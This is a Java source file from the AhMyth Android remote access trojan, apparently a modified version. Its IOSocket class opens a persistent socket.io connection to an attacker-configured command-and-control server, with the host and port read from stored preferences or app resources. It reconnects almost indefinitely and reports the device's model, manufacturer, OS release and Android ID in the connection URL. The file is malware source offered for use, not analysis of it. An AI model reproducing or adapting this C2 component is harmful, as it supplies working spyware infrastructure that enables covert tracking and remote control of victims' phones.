package ahmyth.mine.king.ahmyth;

import android.os.Build;
import android.provider.Settings;
import android.content.SharedPreferences;
import android.content.Context;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * Created by AhMyth on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
        try {
            Context ctx = MainService.getContextOfApplication();
            // Read dynamic server settings from SharedPreferences if present
            SharedPreferences prefs = ctx.getSharedPreferences("ahmyth_prefs", Context.MODE_PRIVATE);
            String prefHost = prefs.getString("server_host", null);
            String prefPort = prefs.getString("server_port", null);

            String defaultHost = ctx.getString(R.string.server_ip);
            String defaultPort = ctx.getString(R.string.server_port);

            String serverHost = (prefHost != null && prefHost.length() > 0) ? prefHost : defaultHost;
            String serverPort = (prefPort != null && prefPort.length() > 0) ? prefPort : defaultPort;

            String deviceID = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            String url;
            // if serverHost already contains scheme, use it directly
            if (serverHost.startsWith("http://") || serverHost.startsWith("https://")) {
                if (serverPort != null && serverPort.length() > 0) {
                    url = serverHost + ":" + serverPort + "?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID;
                } else {
                    url = serverHost + "?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID;
                }
            } else {
                // build with http scheme by default
                if (serverPort != null && serverPort.length() > 0) {
                    url = "http://" + serverHost + ":" + serverPort + "?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID;
                } else {
                    url = "http://" + serverHost + "?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID;
                }
            }

            ioSocket = IO.socket(url, opts);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}
